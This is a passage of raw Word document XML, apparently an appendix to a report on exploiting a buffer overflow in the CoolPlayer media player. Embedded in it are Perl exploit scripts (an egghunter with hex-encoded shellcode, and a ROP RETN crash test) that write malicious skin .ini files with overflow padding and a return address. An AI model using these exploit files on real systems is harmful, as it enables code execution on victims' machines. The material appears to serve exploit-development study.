                    <w:p w14:paraId="7D83FF6D" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x4d\x45\x35\x54\x33\x54\x33\x56\x51\x49\x4b\x4d\x58\x51" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="4BEAF919" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x4c\x51\x34\x54\x4a\x4c\x49\x4d\x33\x52\x48\x56\x4e\x50" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="106321B5" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x58\x51\x30\x51\x30\x45\x38\x52\x4c\x52\x4f\x43\x51\x52" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="4610C644" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x44\x52\x48\x47\x50\x52\x50\x45\x31\x52\x59\x43\x58\x45" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="0C92EA4F" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x35\x43\x52\x52\x4f\x43\x48\x45\x38\x43\x43\x52\x53\x43" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="7B3396BD" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x51\x45\x37\x43\x58\x43\x51\x47\x50\x52\x4d\x43\x55\x43" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="052AB9CA" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x58\x51\x30\x52\x49\x54\x33\x51\x30\x45\x38\x51\x44\x52" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="532627DD" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x48\x43\x59\x43\x43\x50\x31\x49\x59\x4b\x38\x50\x4c\x47" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="79D42CF0" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x54\x45\x4d\x4d\x59\x4d\x31\x50\x31\x4e\x32\x51\x42\x50" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="33A2615E" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x53\x56\x31\x51\x42\x4b\x4f\x4e\x30\x56\x51\x49\x50\x50" .</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="5E3AF0C0" w14:textId="18E21092" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>"\x50\x4b\x4f\x51\x45\x54\x48\x41\x41";</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="1632D5A9" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="373B7B0E" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>open($FILE,"&gt;$file1");</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="7FEC8693" w14:textId="77777777" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>print $FILE $buffer;</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="491687DE" w14:textId="2FF3A1FA" w:rsidR="004D7F6C" w:rsidRPr="00CF75AD" w:rsidRDefault="004D7F6C" w:rsidP="004D7F6C">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="14"/>
                          <w:szCs w:val="14"/>
                        </w:rPr>
                        <w:t>close($FILE);</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="square"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>B7 - Egghunte</w:t>
      </w:r>
      <w:r w:rsidR="00E45F3F">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>r.pl</w:t>
      </w:r>
      <w:bookmarkEnd w:id="67"/>
    </w:p>
    <w:p w14:paraId="34B3F3C8" w14:textId="769C0EC7" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5BEFE14D" w14:textId="1CA32E4D" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B3405F5" w14:textId="55D55481" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7417C428" w14:textId="4ECD36EE" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="31C120CD" w14:textId="5914383B" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77BE0E84" w14:textId="513FCB0C" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="175D772F" w14:textId="77B20828" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="03EFEEAE" w14:textId="26A43E56" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="05F83AC5" w14:textId="1EF33CA9" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="746ACF7F" w14:textId="40A72C81" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="686323F5" w14:textId="3E6758B4" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1DC2BE0B" w14:textId="53017EDE" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B6CE070" w14:textId="1AEB2811" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A6CE5EC" w14:textId="4EBD6F17" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="545BB5D2" w14:textId="5D5B2BC7" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0DAB601E" w14:textId="029304D1" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5D2C75F4" w14:textId="0DB5FC0B" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1992F9C8" w14:textId="36852195" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C662640" w14:textId="65D625E9" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6379527B" w14:textId="405E15AB" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="74722AEB" w14:textId="5AE5657E" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D7370CF" w14:textId="40BB8D77" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="762EE704" w14:textId="00618E07" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3992428A" w14:textId="3B0F711D" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A734A9D" w14:textId="14024427" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="35FD3AD9" w14:textId="4EC776E4" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5528DD6C" w14:textId="0C174EE4" w:rsidR="000F4B5C" w:rsidRDefault="000F4B5C" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="753A484F" w14:textId="77777777" w:rsidR="00E45F3F" w:rsidRDefault="00E45F3F" w:rsidP="000F4B5C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F358C2E" w14:textId="244FABA3" w:rsidR="007C5D85" w:rsidRDefault="00E45F3F" w:rsidP="007C5D85">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="68" w:name="_Toc103326494"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">B8 - ROP </w:t>
      </w:r>
      <w:r w:rsidR="00C14656">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>RETN test (ropcrash.pl)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="68"/>
    </w:p>
    <w:p w14:paraId="1F784769" w14:textId="09C7CC40" w:rsidR="007C5D85" w:rsidRDefault="007C5D85" w:rsidP="007C5D85">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251717632" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="4FF01A72" wp14:editId="42B8DE9C">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>-15240</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>109527</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="3810635" cy="1404620"/>
                <wp:effectExtent l="0" t="0" r="18415" b="2159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635" cy="1404620"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="3CC10B91" w14:textId="77777777" w:rsidR="00C14656" w:rsidRPr="00C14656" w:rsidRDefault="00C14656" w:rsidP="00C14656">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00C14656">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>$file1= "ropcrash.ini";</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="54E59AA2" w14:textId="77777777" w:rsidR="00C14656" w:rsidRPr="00C14656" w:rsidRDefault="00C14656" w:rsidP="00C14656">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00C14656">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>$buffer = "[CoolPlayer Skin]\</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00C14656">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>nPlaylistSkin</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00C14656">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>=";</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="076A1458" w14:textId="77777777" w:rsidR="00C14656" w:rsidRPr="00C14656" w:rsidRDefault="00C14656" w:rsidP="00C14656">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="0B9B1F22" w14:textId="77777777" w:rsidR="00C14656" w:rsidRPr="00C14656" w:rsidRDefault="00C14656" w:rsidP="00C14656">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00C14656">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>$buffer .= "A" x 484;</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="59060071" w14:textId="77777777" w:rsidR="00C14656" w:rsidRPr="00C14656" w:rsidRDefault="00C14656" w:rsidP="00C14656">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00C14656">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t xml:space="preserve">$buffer .= pack('V', 0x77c1128a); </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00C14656">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                              <w:t>#POINTER TO RETN MEMORY LOCATION</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="564BC584" w14:textId="77777777" w:rsidR="00C14656" w:rsidRPr="00C14656" w:rsidRDefault="00C14656" w:rsidP="00C14656">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00C14656">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>$buffer .= "BBBB";</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="33E54A52" w14:textId="3DD3E77F" w:rsidR="00C14656" w:rsidRPr="00C14656" w:rsidRDefault="00C14656" w:rsidP="00C14656">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00C14656">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>$buffer .= "</w:t>
                            </w:r>
                            <w:r>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>CCCC</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00C14656">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>";</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="7E60FECE" w14:textId="77777777" w:rsidR="00C14656" w:rsidRPr="00C14656" w:rsidRDefault="00C14656" w:rsidP="00C14656">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00C14656">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>$buffer .= "DDDD";</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00C14656">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00C14656">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00C14656">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="6A1C2EED" w14:textId="77777777" w:rsidR="00C14656" w:rsidRPr="00C14656" w:rsidRDefault="00C14656" w:rsidP="00C14656">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00C14656">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>open($FILE,"&gt;$file1");</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="5641314F" w14:textId="77777777" w:rsidR="00C14656" w:rsidRPr="00C14656" w:rsidRDefault="00C14656" w:rsidP="00C14656">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00C14656">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>print $FILE $buffer;</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="19A05383" w14:textId="1E0D7D2A" w:rsidR="00C14656" w:rsidRPr="00C14656" w:rsidRDefault="00C14656" w:rsidP="00C14656">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00C14656">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>close($FILE);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F01A72" id="_x0000_s1047" type="#_x0000_t202" style="position:absolute;margin-left:-1.2pt;margin-top:8.6pt;width:300.05pt;height:110.6pt;z-index:251717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">
                <v:textbox style="mso-fit-shape-to-text:t">
                  <w:txbxContent>
                    <w:p w14:paraId="3CC10B91" w14:textId="77777777" w:rsidR="00C14656" w:rsidRPr="00C14656" w:rsidRDefault="00C14656" w:rsidP="00C14656">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00C14656">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>$file1= "ropcrash.ini";</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="54E59AA2" w14:textId="77777777" w:rsidR="00C14656" w:rsidRPr="00C14656" w:rsidRDefault="00C14656" w:rsidP="00C14656">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00C14656">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>$buffer = "[CoolPlayer Skin]\</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00C14656">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>nPlaylistSkin</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00C14656">
                        <w:rPr>
                          <w:sz w:val="16"/>
